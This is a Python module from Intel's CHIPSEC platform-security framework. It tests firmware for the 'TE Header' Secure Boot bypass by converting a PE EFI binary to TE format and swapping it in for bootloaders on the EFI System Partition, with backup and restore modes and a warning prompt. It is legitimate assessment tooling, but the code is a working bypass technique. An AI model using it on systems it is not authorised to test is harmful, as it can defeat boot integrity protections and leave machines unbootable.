# CHIPSEC: Platform Security Assessment Framework
# Copyright (c) 2010-2022, Intel Corporation
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; Version 2.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
# Contact information:
# chipsec@intel.com
#


"""
Tool to test for 'TE Header' vulnerability in Secure Boot implementations as described in
`All Your Boot Are Belong To Us <http://www.c7zero.info/stuff/AllYourBoot_csw14-intel-final.pdf>`_

Usage:
  ``chipsec_main.py -m tools.secureboot.te [-a <mode>,<cfg_file>,<efi_file>]``
      - ``<mode>``

          * ``generate_te``     (default) convert PE EFI binary ``<efi_file>`` to TE binary
          * ``replace_bootloader``  replace bootloader files listed in ``<cfg_file>`` on ESP with modified ``<efi_file>``
          * ``restore_bootloader``  restore original bootloader files from ``.bak`` files

      - ``<cfg_file>``  path to config file listing paths to bootloader files to replace
      - ``<efi_file>``  path to EFI binary to convert to TE binary. If no file path is provided, the tool will look for Shell.efi

Examples:

Convert Shell.efi PE/COFF EFI executable to TE executable:

  ``chipsec_main.py -m tools.secureboot.te -a generate_te,Shell.efi``

Replace bootloaders listed in te.cfg file with TE version of Shell.efi executable:

  ``chipsec_main.py -m tools.secureboot.te -a replace_bootloader,te.cfg,Shell.efi``

Restore bootloaders listed in te.cfg file:

  ``chipsec_main.py -m tools.secureboot.te -a restore_bootloader,te.cfg``

"""

import os
import shutil
import struct
import sys

from chipsec.module_common import BaseModule
from chipsec.library.returncode import ModuleResult
from chipsec.library.logger import logger


DEFAULT_PE_FILE_PATH = "chipsec/modules/tools/secureboot/Shell.efi"
DEFAULT_CONFIG_FILE_PATH = 'chipsec/modules/tools/secureboot/te.cfg'

# typedef struct _IMAGE_DOS_HEADER
# {
#      WORD e_magic;
#      WORD e_cblp;
#      WORD e_cp;
#      WORD e_crlc;
#      WORD e_cparhdr;
#      WORD e_minalloc;
#      WORD e_maxalloc;
#      WORD e_ss;
#      WORD e_sp;
#      WORD e_csum;
#      WORD e_ip;
#      WORD e_cs;
#      WORD e_lfarlc;
#      WORD e_ovno;
#      WORD e_res[4];
#      WORD e_oemid;
#      WORD e_oeminfo;
#      WORD e_res2[10];
#      LONG e_lfanew;
# } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

IMAGE_DOS_HEADER = "<14H4HHH10Hi"
IMAGE_DOS_HEADER_size = struct.calcsize(IMAGE_DOS_HEADER)
E_MAGIC = 0x5A4D
E_MAGIC_STR = "MZ"

# typedef struct _IMAGE_DATA_DIRECTORY
# {
#      ULONG VirtualAddress;
#      ULONG Size;
# } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

IMAGE_DATA_DIRECTORY = "<II"
IMAGE_DATA_DIRECTORY_size = struct.calcsize(IMAGE_DATA_DIRECTORY)

IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

# typedef struct _IMAGE_OPTIONAL_HEADER
# {
#      WORD Magic;
#      UCHAR MajorLinkerVersion;
#      UCHAR MinorLinkerVersion;
#      ULONG SizeOfCode;
#      ULONG SizeOfInitializedData;
#      ULONG SizeOfUninitializedData;
#      ULONG AddressOfEntryPoint;
#      ULONG BaseOfCode;
#      ULONG BaseOfData;
#      ULONG ImageBase;
#      ULONG SectionAlignment;
#      ULONG FileAlignment;
#      WORD MajorOperatingSystemVersion;
#      WORD MinorOperatingSystemVersion;
#      WORD MajorImageVersion;
#      WORD MinorImageVersion;
#      WORD MajorSubsystemVersion;
#      WORD MinorSubsystemVersion;
#      ULONG Win32VersionValue;
#      ULONG SizeOfImage;
#      ULONG SizeOfHeaders;
#      ULONG CheckSum;
#      WORD Subsystem;
#      WORD DllCharacteristics;
#      ULONG SizeOfStackReserve;
#      ULONG SizeOfStackCommit;
#      ULONG SizeOfHeapReserve;
#      ULONG SizeOfHeapCommit;
#      ULONG LoaderFlags;
#      ULONG NumberOfRvaAndSizes;
#      IMAGE_DATA_DIRECTORY DataDirectory[16];
# } IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;

IMAGE_OPTIONAL_HEADER = "<HBB9I6H4I2H6I"
IMAGE_OPTIONAL_HEADER_size = struct.calcsize(IMAGE_OPTIONAL_HEADER)
IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b

# typedef struct {
#   //
#   // Standard fields.
#   //
#   UINT16                    Magic;
#   UINT8                     MajorLinkerVersion;
#   UINT8                     MinorLinkerVersion;
#   UINT32                    SizeOfCode;
#   UINT32                    SizeOfInitializedData;
#   UINT32                    SizeOfUninitializedData;
#   UINT32                    AddressOfEntryPoint;
#   UINT32                    BaseOfCode;
#   //
#   // NT additional fields.
#   //
#   UINT64                    ImageBase;
#   UINT32                    SectionAlignment;
#   UINT32                    FileAlignment;
#   UINT16                    MajorOperatingSystemVersion;
#   UINT16                    MinorOperatingSystemVersion;
#   UINT16                    MajorImageVersion;
#   UINT16                    MinorImageVersion;
#   UINT16                    MajorSubsystemVersion;
#   UINT16                    MinorSubsystemVersion;
#   UINT32                    Win32VersionValue;
#   UINT32                    SizeOfImage;
#   UINT32                    SizeOfHeaders;
#   UINT32                    CheckSum;
#   UINT16                    Subsystem;
#   UINT16                    DllCharacteristics;
#   UINT64                    SizeOfStackReserve;
#   UINT64                    SizeOfStackCommit;
#   UINT64                    SizeOfHeapReserve;
#   UINT64                    SizeOfHeapCommit;
#   UINT32                    LoaderFlags;
#   UINT32                    NumberOfRvaAndSizes;
#   EFI_IMAGE_DATA_DIRECTORY  DataDirectory[EFI_IMAGE_NUMBER_OF_DIRECTORY_ENTRIES];
# } EFI_IMAGE_OPTIONAL_HEADER64;

IMAGE_OPTIONAL_HEADER64 = "<HBBIIIIIQIIHHHHHHIIIIHHQQQQII"
IMAGE_OPTIONAL_HEADER64_size = struct.calcsize(IMAGE_OPTIONAL_HEADER64)
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b

# typedef struct _IMAGE_FILE_HEADER
# {
#      WORD Machine;
#      WORD NumberOfSections;
#      ULONG TimeDateStamp;
#      ULONG PointerToSymbolTable;
#      ULONG NumberOfSymbols;
#      WORD SizeOfOptionalHeader;
#      WORD Characteristics;
# } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

IMAGE_FILE_HEADER = "<2H3I2H"
IMAGE_FILE_HEADER_size = struct.calcsize(IMAGE_FILE_HEADER)

# typedef struct _IMAGE_NT_HEADERS
# {
#      ULONG Signature;
#      IMAGE_FILE_HEADER FileHeader;
#      IMAGE_OPTIONAL_HEADER OptionalHeader;
# } IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;

IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_NT_HEADERS_size = (4 + IMAGE_FILE_HEADER_size + IMAGE_OPTIONAL_HEADER_size + IMAGE_NUMBEROF_DIRECTORY_ENTRIES * IMAGE_DATA_DIRECTORY_size)

# typedef struct _IMAGE_SECTION_HEADER
# {
#      UCHAR Name[8];
#      ULONG Misc;
#      ULONG VirtualAddress;
#      ULONG SizeOfRawData;
#      ULONG PointerToRawData;
#      ULONG PointerToRelocations;
#      ULONG PointerToLinenumbers;
#      WORD NumberOfRelocations;
#      WORD NumberOfLinenumbers;
#      ULONG Characteristics;
# } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

IMAGE_SECTION_HEADER = "<8s6I2HI"
IMAGE_SECTION_HEADER_size = struct.calcsize(IMAGE_SECTION_HEADER)

# PE executable structure
#
#   MS-DOS header
#     ...
#     e_lfanew -------------------+
#                                 |
#                                 |
#   IMAGE_NT_HEADERS Header  <----+
#    ...
#   SECTION TABLE
#    ...
# TE header
#
# typedef struct {
#   UINT16                    Signature;            // signature for TE format = "VZ"
#   UINT16                    Machine;              // from the original file header
#   UINT8                     NumberOfSections;     // from the original file header
#   UINT8                     Subsystem;            // from original optional header
#   UINT16                    StrippedSize;         // how many bytes we removed from the header
#   UINT32                    AddressOfEntryPoint;  // offset to entry point -- from original optional header
#   UINT32                    BaseOfCode;           // from original image -- required for ITP debug
#   UINT64                    ImageBase;            // from original file header
#   IMAGE_DATA_DIRECTORY      DataDirectory[2];     // only base relocation and debug directory
# } EFI_TE_IMAGE_HEADER;

EFI_TE_IMAGE_HEADER = "<HHBBHIIQ"
EFI_TE_IMAGE_HEADER_SIGNATURE = 0x5A56

EFI_IMAGE_DIRECTORY_ENTRY_EXPORT = 0
EFI_IMAGE_DIRECTORY_ENTRY_IMPORT = 1
EFI_IMAGE_DIRECTORY_ENTRY_RESOURCE = 2
EFI_IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
EFI_IMAGE_DIRECTORY_ENTRY_SECURITY = 4
EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
EFI_IMAGE_DIRECTORY_ENTRY_DEBUG = 6
EFI_IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7
EFI_IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8
EFI_IMAGE_DIRECTORY_ENTRY_TLS = 9
EFI_IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10

EFI_TE_IMAGE_DIRECTORY_ENTRY_BASERELOC = 0
EFI_TE_IMAGE_DIRECTORY_ENTRY_DEBUG = 1


def IsValidPEHeader(data):
    size = len(data)
    if size < IMAGE_DOS_HEADER_size:
        return False
    signature, = struct.unpack("<H", data[:2])
    if signature != E_MAGIC:
        return False
    e_lfanew, = struct.unpack("<I", data[IMAGE_DOS_HEADER_size - 4:IMAGE_DOS_HEADER_size])
    if e_lfanew >= size:
        return False
    if (size - e_lfanew) < IMAGE_NT_HEADERS_size:
        return False
    pe_signature, = struct.unpack("<I", data[e_lfanew:e_lfanew + 4])
    if pe_signature != IMAGE_NT_SIGNATURE:
        return False
    return True


def replace_header(data):
    if not IsValidPEHeader(data):
        return None
    size = len(data)
    e_lfanew, = struct.unpack("<I", data[IMAGE_DOS_HEADER_size - 4:IMAGE_DOS_HEADER_size])
    #                          TimeDateStamp, PointerToSymbolTable, NumberOfSymbols, SizeOfOptionalHeader, Characteristics
    Machine, NumberOfSections, u1, u2, u3, SizeOfOptionalHeader, u5 \
        = struct.unpack(IMAGE_FILE_HEADER, data[e_lfanew + 4:e_lfanew + 4 + IMAGE_FILE_HEADER_size])
    StrippedSize = e_lfanew + 4 + IMAGE_FILE_HEADER_size + SizeOfOptionalHeader
    if StrippedSize > size:
        return None
    if StrippedSize & ~0xffff:
        return None
    dof = e_lfanew + 4 + IMAGE_FILE_HEADER_size
    Magic, = struct.unpack("<H", data[dof:dof + 2])
    if Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC:
        Magic, MajorLinkerVersion, MinorLinkerVersion, SizeOfCode, SizeOfInitializedData, \
            SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase,  \
            SectionAlignment, FileAlignment, MajorOperatingSystemVersion, MinorOperatingSystemVersion, \
            MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, \
            Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics, \
            SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, LoaderFlags, \
            NumberOfRvaAndSizes = struct.unpack(IMAGE_OPTIONAL_HEADER, data[dof:dof + IMAGE_OPTIONAL_HEADER_size])
        dof = dof + IMAGE_OPTIONAL_HEADER_size
    elif Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
        Magic, MajorLinkerVersion, MinorLinkerVersion, SizeOfCode, SizeOfInitializedData, \
            SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, ImageBase, SectionAlignment, \
            FileAlignment, MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, \
            MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, Win32VersionValue, \
            SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics, SizeOfStackReserve, \
            SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, LoaderFlags, NumberOfRvaAndSizes \
            = struct.unpack(IMAGE_OPTIONAL_HEADER64, data[dof:dof + IMAGE_OPTIONAL_HEADER64_size])
        dof = dof + IMAGE_OPTIONAL_HEADER64_size
    else:
        return None
    if NumberOfSections & ~0xFF:
        return None
    if Subsystem & ~0xFF:
        return None

    basereloc_off = dof + EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC * IMAGE_DATA_DIRECTORY_size
    debug_off = dof + EFI_IMAGE_DIRECTORY_ENTRY_DEBUG * IMAGE_DATA_DIRECTORY_size
    BASERELOC = "\x00\x00\x00\x00\x00\x00\x00\x00"
    DEBUG = "\x00\x00\x00\x00\x00\x00\x00\x00"
    if NumberOfRvaAndSizes > EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC:
        BASERELOC = data[basereloc_off:basereloc_off + IMAGE_DATA_DIRECTORY_size]
    if NumberOfRvaAndSizes > EFI_IMAGE_DIRECTORY_ENTRY_DEBUG:
        DEBUG = data[debug_off:debug_off + IMAGE_DATA_DIRECTORY_size]
    te_header = struct.pack(EFI_TE_IMAGE_HEADER,
                            EFI_TE_IMAGE_HEADER_SIGNATURE, Machine, NumberOfSections, Subsystem, StrippedSize, AddressOfEntryPoint, BaseOfCode, ImageBase)
    te_data = te_header + BASERELOC + DEBUG + data[StrippedSize:]
    return te_data


def produce_te(fname, outfname):
    data = ''
    with open(fname, 'rb') as f:
        data = f.read()
    te_data = replace_header(data)
    if te_data is None:
        return 0
    with open(outfname, 'wb') as fte:
        fte.write(te_data)
    return 1


def replace_efi_binary(orig_efi_binary, new_efi_binary):
    logger().log(f'[*] Replacing EFI binary \'{orig_efi_binary}\'..')
    te_binary = new_efi_binary + '.te'
    if not os.path.exists(te_binary):
        produce_te(new_efi_binary, te_binary)
    # back up original binary
    backup = orig_efi_binary + '.bak'
    if not os.path.exists(backup):
        os.rename(orig_efi_binary, backup)
    try:
        shutil.copy(te_binary, orig_efi_binary)
    except OSError as err:
        logger().log_error(f'Cannot replace binary ({err})')
        return False
    return True


def umount(drive):
    import subprocess
    if os.path.exists(drive):
        res = subprocess.call(["mountvol.exe", drive, "/D"])
        if res != 0:
            logger().log_warning(f'Cannot unmount EFI System partition: {res:d}')


def get_efi_mount():
    import subprocess
    for l in range(ord('z'), ord('a'), -1):
        if not os.path.exists('%c:\\' % l):
            res = subprocess.call(["mountvol.exe", "%c:\\" % l, "/S"])
            if res != 0:
                logger().log_error(f'Cannot mount EFI System partition (status = {res:d})')
                return None
            return '%c:\\' % l
    logger().log_error("Cannot mount EFI System partition. No drive letters to use.")
    return None


def get_bootloader_paths(cfg_file):
    bootloader_paths = []
    with open(cfg_file, 'r') as fcfg:
        logger().log(f'[*] reading paths from \'{cfg_file}\'..')
        for line in fcfg:
            bl_path = line.rstrip()
            if bl_path is not None:
                logger().log(f'    adding path \'{bl_path}\'..')
                bootloader_paths.append(bl_path)
    return bootloader_paths


def replace_bootloader(bootloader_paths, new_bootloader_file, do_mount=True):
    logger().log("[*] Replacing bootloaders on EFI System Partition (ESP)...")
    dsk = get_efi_mount() if do_mount else ''
    if dsk is None:
        return False
    try:
        for pth in bootloader_paths:
            bootloader_path = os.path.join(dsk, pth)
            if os.path.exists(bootloader_path):
                replace_efi_binary(bootloader_path, new_bootloader_file)
            else:
                logger().log_warning(f'Bootloader {bootloader_path} does not exist on ESP')
    finally:
        if do_mount:
            umount(dsk)
    logger().log("[*] You will need to reboot the system to see the changes")
    return True


def restore_efi_binary(orig_efi_binary):
    logger().log(f'[*] Restoring {orig_efi_binary}..')
    backup = orig_efi_binary + ".bak"
    if not os.path.exists(backup):
        logger().log_error(f'Cannot restore original binary: \'{backup}\' not found')
        return False
    try:
        if os.path.exists(orig_efi_binary):
            os.remove(orig_efi_binary)
        os.rename(backup, orig_efi_binary)
    except OSError as err:
        logger().log_error(f'Cannot restore original binary ({err})')
        return False
    return True


def restore_bootloader(bootloader_paths, do_mount=True):
    logger().log("[*] Restoring bootloaders on EFI System Partition (ESP)...")
    dsk = get_efi_mount() if do_mount else ''
    if dsk is None:
        return False
    for pth in bootloader_paths:
        bootloader_path = os.path.join(dsk, pth)
        if os.path.exists(bootloader_path):
            restore_efi_binary(bootloader_path)
    if do_mount:
        umount(dsk)
    logger().log("[*] You will need to reboot the system to see the changes")
    return True


def confirm():
    logger().log_important("***************************************************************************************")
    logger().log_important("*")
    logger().log_important("* RUNNING THIS TOOL MAY RESULT IN UNBOOTABLE OS!")
    logger().log_important("* USE IT FOR TESTING PURPOSES ON TEST SYSTEMS ONLY")
    logger().log_important("*")
    logger().log_important("* The tool converts PE/COFF EFI executables to TE EFI executables.")
    logger().log_important("* The tool can also automatically replace files (boot loaders)")
    logger().log_important("* listed in the configuration file with the generated TE executable.")
    logger().log_important("*")
    logger().log_important("* If after reboot, TE executable runs then the firmware doesn't properly")
    logger().log_important("* enforce Secure Boot checks on TE EFI executables")
    logger().log_important("*")
    logger().log_important("* If TE executable doesn't run then the firmware correctly blocked it.")
    logger().log_important("* To restore OS boot loader in this case you may use one of the following:")
    logger().log_important("* - Disable Secure Boot in BIOS, boot to external drive (e.g. Linux or UEFI shell)")
    logger().log_important("*   then restore original boot loader executables from .bak files")
    logger().log_important("* - On Windows, use recovery mode which should automatically restore correct executables")
    logger().log_important("*")
    logger().log_important("***************************************************************************************")
    s = input("Type 'yes' to continue running the tool > ")
    if s.lower() not in ['yes', 'y']:
        sys.exit(0)


def usage():
    logger().log('Usage:\n' +
                 'chipsec_main.py -m tools.secureboot.te [-a <mode>,<cfg_file>,<efi_file>]\n' +
                 '    <mode>\n' +
                 '      generate_te        - (default) convert PE EFI binary <efi_file> to TE binary\n' +
                 '      replace_bootloader - replace bootloader files listed in <cfg_file> on ESP with modified <efi_file>\n' +
                 '      restore_bootloader - restore original bootloader files from .bak files\n' +
                 '    <cfg_file>           - path to config file listing paths to bootloader files to replace\n' +
                 '    <efi_file>           - path to EFI binary to convert to TE binary\n' +
                 '                           If no file path is provided, the tool will look for Shell.efi\n')


class te(BaseModule):

    def __init__(self):
        BaseModule.__init__(self)

    def is_supported(self):
        #win8 = self.cs.helper.is_win8_or_greater()
        efi_mode = self.cs.helper.EFI_supported()
        if not efi_mode:
            self.logger.log_not_applicable("OS did not boot in UEFI mode")
        return efi_mode

    def run(self, module_argv):
        self.logger.start_test("'TE Header' Secure Boot Bypass Test")
        usage()

        sts = False
        do_mount = True
        file_path = DEFAULT_PE_FILE_PATH
        te_cfg = DEFAULT_CONFIG_FILE_PATH
        mode = module_argv[0] if len(module_argv) > 0 else 'generate_te'

        if 'generate_te' == mode:
            if len(module_argv) > 1:
                file_path = module_argv[1]
            if not os.path.exists(file_path):
                self.logger.log_error(f'Cannot find file \'{file_path}\'')
                self.logger.log_error(f'Please download it from https://github.com/chipsec/chipsec/releases/download/binaries/Shell.efi ')
                self.logger.log_error(f'And move file to \'{file_path}\'')
                self.result.setStatusBit(self.result.status.ACCESS_RW)
                return self.result.getReturnCode(ModuleResult.ERROR)

            sts = replace_efi_binary(file_path, file_path)

        elif ('restore_bootloader' == mode) or ('replace_bootloader' == mode):
            confirm()

            if len(module_argv) > 1:
                te_cfg = module_argv[1]
            if not os.path.exists(te_cfg):
                self.logger.log_error(f'Cannot find file \'{te_cfg}\'')
                self.result.setStatusBit(self.result.status.ACCESS_RW)
                return self.result.getReturnCode(ModuleResult.ERROR)

            bootloader_paths = get_bootloader_paths(te_cfg)
            if len(bootloader_paths) == 0:
                self.logger.log("[*] no bootloaders to replace. Exit...")
                self.result.setStatusBit(self.result.status.FEATURE_DISABLED)
                return self.result.getReturnCode(ModuleResult.WARNING)

            do_mount = self.cs.os_helper.is_windows()  # @TODO
            if 'restore_bootloader' == mode:
                sts = restore_bootloader(bootloader_paths, do_mount)
            elif 'replace_bootloader' == mode:
                if len(module_argv) > 2:
                    file_path = module_argv[2]
                sts = replace_bootloader(bootloader_paths, file_path, do_mount)

        else:
            self.logger.log_error(f'Invalid mode: \'{mode}\'')

        if sts:
            self.result.setStatusBit(self.result.status.SUCCESS)
            return self.result.getReturnCode(ModuleResult.PASSED)
        else:
            self.result.setStatusBit(self.result.status.RESTORE)
            return self.result.getReturnCode(ModuleResult.ERROR)
